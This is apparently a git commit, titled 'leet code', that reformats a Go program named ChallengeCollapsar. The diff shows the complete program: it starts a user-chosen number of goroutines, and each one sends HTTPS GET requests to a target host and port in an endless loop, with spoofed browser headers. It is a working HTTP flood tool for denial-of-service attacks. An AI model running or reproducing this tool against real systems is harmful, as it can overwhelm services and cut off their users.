65ba543f1dfff38b3306da1e9b0d7e4e4dd778a4
concurrent <concurrent.exec@gmail.com>
2019-12-29 16:32:01 +0800

    leet code

--- packages/ChallengeCollapsar/main.go
+++ packages/ChallengeCollapsar/main.go
@@ -1,20 +1,20 @@
 package main
 
-import(
-	"net/http"
+import (
 	"flag"
 	"fmt"
-	"time"
 	"io/ioutil"
+	"net/http"
+	"time"
 )
 
-var(
-	inputThread int
+var (
+	inputThread  int
 	inputDesHost string
 	inputDesPort string
 )
 
-func init(){
+func init() {
 	flag.IntVar(&inputThread, "w", 1, "Thread number")
 	flag.StringVar(&inputDesHost, "host", "127.0.0.1", "dist host")
 	flag.StringVar(&inputDesPort, "port", "443", "Dist port")
@@ -23,12 +23,12 @@ func init(){
 
 func NewRequest(url string) *http.Request {
 	req, err := http.NewRequest("GET", url, nil)
-	if err != nil{
+	if err != nil {
 		panic("[http.NewRequest]" + err.Error())
 	}
 	req.Header.Add("User-Agent", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36`)
 	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3")
-	req.Header.Add("Connection","keep-alive")
+	req.Header.Add("Connection", "keep-alive")
 	req.Header.Add("Cache-Control", "max-age=0")
 	return req
 }
@@ -42,26 +42,25 @@ func NewClient() *http.Client {
 	return &http.Client{Transport: tr}
 }
 
-func send(client *http.Client, request *http.Request){
+func send(client *http.Client, request *http.Request) {
 	resp, err := client.Do(request)
-	if err != nil{
+	if err != nil {
 		fmt.Println("[Error] " + err.Error())
 	}
 	defer resp.Body.Close()
-	
+
 	// data, _ := ioutil.ReadAll(resp.Body)
 	ioutil.ReadAll(resp.Body)
-	fmt.Println("[success] ",time.Now().Format("2006-01-02 15:04:05"))
+	fmt.Println("[success] ", time.Now().Format("2006-01-02 15:04:05"))
 }
 
+func main() {
 
-func main(){
-		
-	for i := 0;i < inputThread;i++{		
-		go func(){
+	for i := 0; i < inputThread; i++ {
+		go func() {
 			client := NewClient()
 			request := NewRequest(fmt.Sprintf("https://%s:%s", inputDesHost, inputDesPort))
-			for{
+			for {
 				send(client, request)
 			}
 		}()
